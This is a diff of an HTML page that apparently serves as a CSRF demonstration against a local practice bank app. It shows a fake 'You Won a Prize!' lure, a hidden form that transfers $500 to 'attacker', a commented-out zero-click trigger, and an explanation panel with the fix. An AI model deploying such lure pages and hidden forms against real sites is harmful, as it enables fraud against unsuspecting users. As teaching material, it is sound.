@@ -1,24 +1,92 @@
 <!DOCTYPE html>
 <html>
-<head><title>You Won a Prize!</title></head>
+<head>
+  <meta charset="utf-8">
+  <title>You Won a Prize!</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: sans-serif; background: #fff8e1; min-height: 100vh;
+           display: flex; align-items: center; justify-content: center; }
+    .box { background: #fff; border: 2px solid #f9a825; border-radius: 12px;
+           padding: 40px; max-width: 440px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,.1); }
+    h1 { color: #e65100; font-size: 1.5em; margin-bottom: 12px; }
+    p  { color: #555; margin-bottom: 20px; line-height: 1.5; }
+    button { background: #e65100; color: #fff; border: none; padding: 14px 32px;
+             font-size: 1.1em; border-radius: 6px; cursor: pointer; }
+    button:hover { background: #bf360c; }
+    #status { margin-top: 16px; font-size: 0.85em; color: #888; }
+
+    /* Explanation panel — shown only when ?explain=1 is in the URL */
+    .explain { display: none; background: #1a1a2e; color: #ddd; border-radius: 8px;
+               padding: 20px; margin-top: 24px; text-align: left; font-size: 0.83em; line-height: 1.7; }
+    code { background: #0c1830; padding: 1px 5px; border-radius: 3px; color: #f39c12; font-family: monospace; }
+  </style>
+</head>
 <body>
-  <h1>Congratulations! Click below to claim your $100 gift card.</h1>
-  <button onclick="document.getElementById('csrf').submit()">Claim Prize</button>
 
   <!--
-    CSRF ATTACK: This form submits to VulnBank's /transfer endpoint.
-    If the victim is logged in to localhost:3000, their browser will
-    attach their session cookie automatically — the server can't tell
-    this request didn't come from its own page.
+    CSRF ATTACK — HOW IT WORKS
+    ──────────────────────────
+    1. Victim logs in to VulnSite at http://localhost:3000
+       → browser stores their session cookie
 
-    To demo:
-      1. Log in to http://localhost:3000 as alice
-      2. Open http://localhost:3000/attacker.html in the same browser
-      3. Click "Claim Prize" — alice's balance drops by 500
+    2. Attacker tricks victim into opening THIS page
+       (different origin: served from file:// or a different domain)
+       → victim sees an innocent-looking prize page
+
+    3. Victim clicks "Claim Prize" (or attack fires on page load)
+       → browser submits the hidden form to http://localhost:3000/transfer
+
+    4. Browser automatically attaches the victim's session cookie
+       because the server set: cookie: { sameSite: false }
+
+    5. VulnSite validates the session and executes the transfer — $500 sent to attacker.
+
+    The server has no way to tell the request came from a foreign page.
+    No CSRF token was checked. No Origin header was validated.
   -->
-  <form id="csrf" action="http://localhost:3000/transfer" method="POST" style="display:none">
+
+  <div class="box">
+    <h1>You Won a Prize!</h1>
+    <p>Congratulations! You have been selected to receive a <strong>$100 gift card</strong>.<br>
+       Click below to claim your reward instantly.</p>
+    <button onclick="attack()">Claim My Prize</button>
+    <div id="status"></div>
+
+    <div class="explain" id="explain">
+      <strong>CSRF Attack Breakdown</strong><br><br>
+      This page submits a hidden form to <code>http://localhost:3000/transfer</code>.<br>
+      Because <code>sameSite</code> is not set to <code>Strict</code> or <code>Lax</code>, the browser
+      attaches the victim's session cookie to the cross-origin POST.<br><br>
+      The victim's account is debited <code>$500</code> and <code>attacker</code> receives it —
+      without the victim's knowledge or consent.<br><br>
+      <strong>Fix:</strong> add a random CSRF token to every state-changing form and validate it server-side,
+      and/or set <code>SameSite=Strict</code> on the session cookie.
+    </div>
+  </div>
+
+  <!-- Hidden CSRF payload — victim never sees this -->
+  <form id="csrf-form" action="http://localhost:3000/transfer" method="POST" style="display:none">
     <input type="hidden" name="to"     value="attacker" />
     <input type="hidden" name="amount" value="500" />
   </form>
+
+  <script>
+    // Show explanation panel when ?explain=1 is appended to the URL
+    if (new URLSearchParams(location.search).get('explain') === '1') {
+      document.getElementById('explain').style.display = 'block'
+    }
+
+    function attack() {
+      document.getElementById('status').textContent = 'Processing your reward...'
+      document.getElementById('csrf-form').submit()
+      // After submit the browser navigates to /dashboard — the victim just
+      // sees their balance drop with no other visible indication of an attack.
+    }
+
+    // Uncomment for a zero-click attack (fires on page load, no button needed):
+    // window.onload = attack
+  </script>
+
 </body>
 </html>
